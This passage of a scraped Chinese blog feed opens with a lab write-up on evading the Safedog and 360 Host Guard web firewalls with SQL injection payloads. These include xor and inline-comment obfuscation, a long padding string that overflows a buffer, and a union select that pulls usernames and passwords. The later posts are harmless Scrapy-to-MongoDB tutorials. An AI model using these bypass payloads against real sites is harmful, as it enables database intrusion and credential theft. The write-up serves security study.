class="language-none">http:&#x2F;&#x2F;192.168.38.132&#x2F;sql.php?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、找寻绕过方法"><a href="#2、找寻绕过方法" class="headerlink" title="2、找寻绕过方法"></a>2、找寻绕过方法</h2><pre class="line-numbers language-none"><code class="language-none">&#39; and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>多次测试发现单引号不会被拦截，and 也不会被拦截，只有当 and 后加上字符，比如 and ‘1’ 的时候才会被拦截，所以接下来就主要针对 and 进行绕过测试。</p><p>一般情况下，如果 and 被拦截，可以下列字符进行绕过。</p><pre class="line-numbers language-none"><code class="language-none">+，-，*，%，&#x2F;，&lt;&lt;，&gt;&gt;，||，|，&amp;，&amp;&amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 or 进行绕过，也可以直接使用异或进行绕过。</p><pre class="line-numbers language-none"><code class="language-none">^，xor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为我下载的版本的规则是最新的，所以参考文章中利用 &amp;&amp; 替换 and 的方法已经失效了，经过多次测试，这里使用异或是可以绕过安全狗进而判断注入点的。</p><pre class="line-numbers language-none"><code class="language-none">&#39; xor &#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来使用 union select 查看一下数据库名和用户名。</p><pre class="line-numbers language-none"><code class="language-none">&#39;union select database(),user()&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接这样肯定会被拦截的，所以接下来找寻绕过方法。</p><h3 id="a、利用-代替空格"><a href="#a、利用-代替空格" class="headerlink" title="a、利用()代替空格"></a>a、利用()代替空格</h3><pre class="line-numbers language-none"><code class="language-none">&#39;union select(database()),(user())&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据或者函数周围可以无限嵌套()。</p><h3 id="b、利用-mysql-特性-执行语句"><a href="#b、利用-mysql-特性-执行语句" class="headerlink" title="b、利用 mysql 特性 /!/ 执行语句"></a>b、利用 mysql 特性 /<em>!</em>/ 执行语句</h3><pre class="line-numbers language-none"><code class="language-none">&#39;union &#x2F;*!50010select*&#x2F;(database()),(user())&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>/<em>!</em>/ 中间的代码是可以执行的，其中 50010 为 mysql 版本号，只要 mysql 大于这个版本就会执行里面的代码。</p><h3 id="c、利用-混淆代码"><a href="#c、利用-混淆代码" class="headerlink" title="c、利用/**/混淆代码"></a>c、利用/**/混淆代码</h3><pre class="line-numbers language-none"><code class="language-none">&#39;union&#x2F;**&#x2F;&#x2F;*!50010select*&#x2F;(database&#x2F;**&#x2F;()),(user&#x2F;**&#x2F;())&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mysql 关键字中是不能插入 /**/ 的，即 se/**/lect 是会报错的，但是函数名和括号之间是可以加上 /**/ 的,像 database/**/() 这样的代码是可以执行的。</p><p>事实上，由于我的防护规则是 2019-11-27 更新的，所以即使如此，依旧不能绕过，不过由于安全狗对于 GET 的过滤相较于 POST 更为严格，所以后来经过测试发现使用 POST 方法是可以进行绕过的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到使用 POST 方法是可以成功绕过，除了上面的3个方法，有时候使用 %00 也会有意想不到的效果。</p><p>知道了绕过方法，便可以一路找到用户名和密码。</p><pre class="line-numbers language-none"><code class="language-none">&#39;union select user,password from users#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>经过测试，发现在 POST 方法下，加个括号即可绕过安全狗，这也足以看出安全狗对于 POST 方法的过滤是多么不严格。</p><pre class="line-numbers language-none"><code class="language-none">&#39;union select user,password from (users)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>绕过的方法还有很多，安全狗的就记录到这里，接下来看看 360 主机卫士。</p><h1 id="0x03-360-主机卫士"><a href="#0x03-360-主机卫士" class="headerlink" title="0x03 360 主机卫士"></a>0x03 360 主机卫士</h1><h2 id="1、搭建-1"><a href="#1、搭建-1" class="headerlink" title="1、搭建"></a>1、搭建</h2><p>曾经 360 出现过一款 360 主机卫士，不过现在已经停止更新和维护了，官网也打不开了，所以只能在第三方网站下载了，这里我下载的是 2.0.5.9 版本。</p><p>下载地址：<a href="http://www.pc6.com/softview/SoftView_145230.html">http://www.pc6.com/softview/SoftView_145230.html</a></p><p>虽然 360 主机卫士已经停止了更新，但是拿来练练手还是可以滴。</p><p>下载之后，访问 ‘ and ‘1’=’1 如果发现被拦截了，返回内容像下面这个样子，说明就搭建成功了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、找寻绕过方法-1"><a href="#2、找寻绕过方法-1" class="headerlink" title="2、找寻绕过方法"></a>2、找寻绕过方法</h2><pre class="line-numbers language-none"><code class="language-none">&#39; and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>经过多次测试，这里使用 &amp;&amp; 即可绕过，使用异或也是可以绕过的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来看看 union select 怎么进行绕过。</p><pre class="line-numbers language-none"><code class="language-none">&#39;union select database(),user()&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>经过多次测试，发现可以通过缓冲区溢出进行绕过，但也只有在 POST 方法下才有效。</p><pre class="line-numbers language-none"><code class="language-none">&#39; and (select 1)&#x3D;(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)union select database(),user()&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x04-工具"><a href="#0x04-工具" class="headerlink" title="0x04 工具"></a>0x04 工具</h1><p>提到 SQL 注入的工具，个人觉着就不得不提 shack2 的超级 SQL 注入工具，针对于上面缓冲区绕过的情况，使用这个工具可以很方便的进行 SQL 注入。</p><p>工具下载地址：<a href="https://github.com/shack2/SuperSQLInjectionV1/releases">https://github.com/shack2/SuperSQLInjectionV1/releases</a></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>把 Burp 中的数据包复制到工具中，在注入标记、编码标记后，就可以获取数据了，对于如何标记注入点不理解的可以看看这个工具的教学视频以及文档，会容易理解些。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SQL_Bypass10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>至于其他更为复杂的绕过，比如上面安全狗的绕过，利用这个工具的注入绕过模块也是可以的，当然使用 sqlmap 的 tamper 脚本也是 OK 的，暂时本文就先记录到这里。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://zhuanlan.zhihu.com/p/41332480">https://zhuanlan.zhihu.com/p/41332480</a><br><a href="https://www.anquanke.com/post/id/102852">https://www.anquanke.com/post/id/102852</a><br><a href="https://www.secpulse.com/archives/68991.html">https://www.secpulse.com/archives/68991.html</a><br><a href="https://www.cnblogs.com/xiaozi/p/9132737.html">https://www.cnblogs.com/xiaozi/p/9132737.html</a><br><a href="https://blog.csdn.net/weixin_30886233/article/details/95871508">https://blog.csdn.net/weixin_30886233/article/details/95871508</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 经验总结 </tag>
            
            <tag> SQL 注入 </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Scrapy 爬虫框架】 6、继续爬虫、终止和重启任务</title>
      <link href="//191226-151707.html"/>
      <url>//191226-151707.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>有时候我们不想只爬一个页面的，比如之前我只爬了主页，但是现在想把其他页面的也爬下来，这就是本文的任务。</p><h1 id="0x01-修改代码"><a href="#0x01-修改代码" class="headerlink" title="0x01 修改代码"></a>0x01 修改代码</h1><p>在之前的基础上，修改 teamssix_blog_spider.py 文件，首先添加 start_urls</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">start_urls <span class="token operator">=</span> <span class="token punctuation">[</span>   <span class="token string">'https://www.teamssix.com'</span><span class="token punctuation">,</span>   <span class="token string">'https://www.teamssix.com/page/2/'</span><span class="token punctuation">,</span>   <span class="token string">'https://www.teamssix.com/page/3/'</span><span class="token punctuation">,</span>   <span class="token string">'https://www.teamssix.com/page/4/'</span><span class="token punctuation">,</span>   <span class="token string">'https://www.teamssix.com/page/5/'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><a id="more"></a><p>接下来在 sub_article 函数尾部添加 parse 函数的全部代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'html.parser'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.post-title'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   url <span class="token operator">=</span> <span class="token string">'https://www.teamssix.com&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token keyword">yield</span> scrapy<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> callback<span class="token operator">=</span>self<span class="token punctuation">.</span>sub_article<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以 sub_article 函数的完整代码就是这个样子：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">sub_article</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>   soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>   title <span class="token operator">=</span> self<span class="token punctuation">.</span>article_title<span class="token punctuation">(</span>soup<span class="token punctuation">)</span>   <span class="token builtin">list</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>article_list<span class="token punctuation">(</span>soup<span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span>   item <span class="token operator">=</span> TeamssixItem<span class="token punctuation">(</span>_id <span class="token operator">=</span> response<span class="token punctuation">.</span>url<span class="token punctuation">,</span>title <span class="token operator">=</span> title<span class="token punctuation">,</span><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">)</span>   <span class="token keyword">yield</span> item   soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'html.parser'</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.post-title'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      url <span class="token operator">=</span> <span class="token string">'https://www.teamssix.com&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">yield</span> scrapy<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> callback<span class="token operator">=</span>self<span class="token punctuation">.</span>sub_article<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从最后一行 callback=self.sub_article 这里不难看出这里其实就是一个循环， sub_article 函数第一遍执行完，又会调用继续执行第二遍，直到 start_urls 被执行完。</p><h1 id="0x02-运行"><a href="#0x02-运行" class="headerlink" title="0x02 运行"></a>0x02 运行</h1><p>代码修改的就这些，接下来直接 scrapy crawl blogurl 运行代码，来到 robo 3T 看看爬取到的数据。</p><p><img src="https://uploader.shimo.im/f/4C5P0BNBAy8DfwVP.png!thumbnail" alt="图片"></p><p>最终在这些 start_urls 中爬取下来了 43 篇文章，Emm，还行。</p><p>这次的 Scrapy 学习笔记就更新到这里，这个项目的代码已经放在了我的 GitHub 里，项目链接已经放在了下面。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>项目地址：<a href="https://github.com/teamssix/scrapy_study_notes">https://github.com/teamssix/scrapy_study_notes</a></p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Scrapy 爬虫框架】 5、利用 pipelines 和 settings 将爬取数据存储到 MongoDB</title>
      <link href="//191226-151702.html"/>
      <url>//191226-151702.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前文中讲到了将爬取的数据导出到文件中，接下来就在前文的代码基础之上，将数据导出到 MongoDB中。</p><h1 id="0x01-配置-pipelines-py"><a href="#0x01-配置-pipelines-py" class="headerlink" title="0x01 配置 pipelines.py"></a>0x01 配置 pipelines.py</h1><p>首先来到 pipelines.py 文件下，在这里写入连接操作数据库的一些功能。</p><p>将连接操作 mongo 所需要的包导入进来</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymongo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><a id="more"></a><p>接下来定义一些参数，注意下面的函数都是在 TeamssixPipeline 类下的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@classmethod</span><span class="token keyword">def</span> <span class="token function">from_crawler</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> crawler<span class="token punctuation">)</span><span class="token punctuation">:</span>    cls<span class="token punctuation">.</span>DB_URL <span class="token operator">=</span> crawler<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'MONGO_DB_URI'</span><span class="token punctuation">)</span>    cls<span class="token punctuation">.</span>DB_NAME <span class="token operator">=</span> crawler<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'MONGO_DB_NAME'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">open_spider</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>client <span class="token operator">=</span> pymongo<span class="token punctuation">.</span>MongoClient<span class="token punctuation">(</span>self<span class="token punctuation">.</span>DB_URL<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>db <span class="token operator">=</span> self<span class="token punctuation">.</span>client<span class="token punctuation">[</span>self<span class="token punctuation">.</span>DB_NAME<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">close_spider</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">process_item</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> item<span class="token punctuation">,</span> spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    collection <span class="token operator">=</span> self<span class="token punctuation">.</span>db<span class="token punctuation">[</span>spider<span class="token punctuation">.</span>name<span class="token punctuation">]</span>    collection<span class="token punctuation">.</span>insert_one<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-配置-settings-py"><a href="#0x02-配置-settings-py" class="headerlink" title="0x02 配置 settings.py"></a>0x02 配置 settings.py</h1><p>ITEM_PIPELINES 是settings.py 文件自带的，把注释符号删掉就好</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ITEM_PIPELINES <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'teamssix.pipelines.TeamssixPipeline'</span><span class="token punctuation">:</span> <span class="token number">300</span><span class="token punctuation">,</span>  <span class="token comment">#优先级，1-1000，数值越低优先级越高</span><span class="token punctuation">&#125;</span>MONGO_DB_URI <span class="token operator">=</span> <span class="token string">'mongodb://localhost:27017'</span>  <span class="token comment">#mongodb 的连接 url</span>MONGO_DB_NAME <span class="token operator">=</span> <span class="token string">'blog'</span>  <span class="token comment">#要连接的库</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-运行"><a href="#0x02-运行" class="headerlink" title="0x02 运行"></a>0x02 运行</h1><p>直接执行命令，不加参数</p><pre class="line-numbers language-none"><code class="language-none">scrapy crawl blogurl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意，如果原来 MongoDB 中没有我们要连接的库， MongoDB 会自己创建，就不需要自己创建了，所以还是蛮方便的，使用 Robo 3T 打开后，就能看到刚才存进的数据。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/scrapy12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html">http://doc.scrapy.org/en/latest/topics/architecture.html</a><br><a href="https://lemmo.xyz/post/Scrapy-To-MongoDB-By-Pipeline.html">https://lemmo.xyz/post/Scrapy-To-MongoDB-By-Pipeline.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Scrapy 爬虫框架】 4、数据项介绍和导出文件</title>
      <link href="//191226-151659.html"/>
      <url>//191226-151659.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>通过上文的内容，已经把博客文章的标题及目录爬取下来了，接下来为了方便数据的保存，我们可以把这些文章的标题及目录给包装成一个数据项，也就是 items。</p><h1 id="0x01-配置-item"><a href="#0x01-配置-item" class="headerlink" title="0x01 配置 item"></a>0x01 配置 item</h1><p>先来到 items.py 文件下，对标题及目录的信息进行包装，为了对这些信息进行区别，还需要有一个 id，所以代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">TeamssixItem</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Item<span class="token punctuation">)</span><span class="token punctuation">:</span>    _id <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    title <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token builtin">list</span> <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><a id="more"></a><p>编辑好 items.py 文件后，来到 teamssix_blog_spider.py 先把刚才编辑的内容引用进来。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> teamssix<span class="token punctuation">.</span>items <span class="token keyword">import</span> TeamssixItem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着创建一个 item ，并抛出 item ，这时这个 item 就会进入到 item pipelines 中处理。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">item <span class="token operator">=</span> TeamssixItem<span class="token punctuation">(</span>_id <span class="token operator">=</span> response<span class="token punctuation">.</span>url<span class="token punctuation">,</span>title <span class="token operator">=</span> title<span class="token punctuation">,</span><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token keyword">yield</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="0x02-运行"><a href="#0x02-运行" class="headerlink" title="0x02 运行"></a>0x02 运行</h1><p>程序中包含 item 的好处就在于可以直接把运行结果输出到文件中，直接 -o 指定导出文件名，scrapy 支持导出 json 、jsonlines 、jl 、csv 、xml 、marshal 、pickle 这几种格式。</p><pre class="line-numbers language-none"><code class="language-none">scrapy crawl blogurl -o result.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外如果发现导出文件乱码，只需要在 settings.py 文件中添加下面一行代码即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">FEED_EXPORT_ENCODING <span class="token operator">=</span> <span class="token string">"gb18030"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果如下：</p><pre class="line-numbers language-none"><code class="language-none">~# scrapy crawl blogurl -o result.json~# cat result2.json[&#123;&quot;_id&quot;: &quot;https:&#x2F;&#x2F;www.teamssix.com&#x2F;year&#x2F;191224-093319.html&quot;, &quot;title&quot;: &quot;【Python Scrapy 爬虫框架】 2、利用 Scrapy 爬取我的博客文章标题链接&quot;, &quot;list&quot;: [&quot;0x00 新建项目&quot;, &quot;0x01 创建一个爬虫&quot;, &quot;0x02 运行爬虫&quot;, &quot;0x03 爬取内容解析&quot;]&#125;,&#123;&quot;_id&quot;: &quot;https:&#x2F;&#x2F;www.teamssix.com&#x2F;year&#x2F;191127-201447.html&quot;, &quot;title&quot;: &quot;【漏洞笔记】Robots.txt站点文件&quot;, &quot;list&quot;: [&quot;0x00 概述&quot;, &quot;0x01 漏洞描述&quot;, &quot;0x02 漏洞危害&quot;, &quot;0x03 修复建议&quot;]&#125;,……省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以很明显的感受到使用 scrapy 可以很方便的将数据导出到文件中，下一篇文章将介绍如何导出到 MongoDB数据库中。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Python </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python Scrapy 爬虫框架】 3、利用 Scrapy 爬取博客文章详细信息</title>
      <link href="//191226-151652.html"/>
      <url>//191226-151652.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h1><p>在之前的文章中，会发现如果直接使用爬取命令，终端会回显很多调试信息，这样输出的内容就会显得很乱，所以就可以使用下面的命令：</p><pre class="line-numbers language-none"><code class="language-none">scrapy crawl blogurl  -s LOG_FILE&#x3D;all.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><a id="more"></a><p>也就是在原来的基础上加上一个 -s 参数，这样调试信息就会保存到参数指定的文件中，不过也可以在 class 下添加下面的代码，这样只会显示调试出现错误的信息，所以这种方式就不用加 -s 了，至于选择哪一个，就需要​视情况而定。​</p><pre class="line-numbers language-none"><code class="language-none">custom_settings &#x3D; &#123;&#39;LOG_LEVEL&#39;:&#39;ERROR&#39;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x01-编写子页面爬取代码"><a href="#0x01-编写子页面爬取代码" class="headerlink" title="0x01 编写子页面爬取代码"></a>0x01 编写子页面爬取代码</h1><p>先来看一行关键代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">yield</span> scrapy<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>callback<span class="token operator">=</span>self<span class="token punctuation">.</span>sub_article<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面这行代码中，使用 yield 返回利用 scrapy 请求 url 所获得的数据，并将数据通过 callback 传递到 sub_article 函数中。</p><p>其实对于 yield 和 return 都可以返回数据，但是利用 yield 返回数据后，还可以继续运行下面的代码，而使用 return 后，接下来的代码就不会再运行了，在 scrapy 中，如果使用 return 返回数据再用 list 存储数据，会造成不少的内存消耗，而使用 yield 则可以减少这些不必要的内存浪费。</p><p>所以接下来在 sub_article 函数中写上我们爬取子页面的代码即可，这里就爬取每个文章的标题和目录作为示例了。</p><pre class="line-numbers language-python" data-language="python"><code 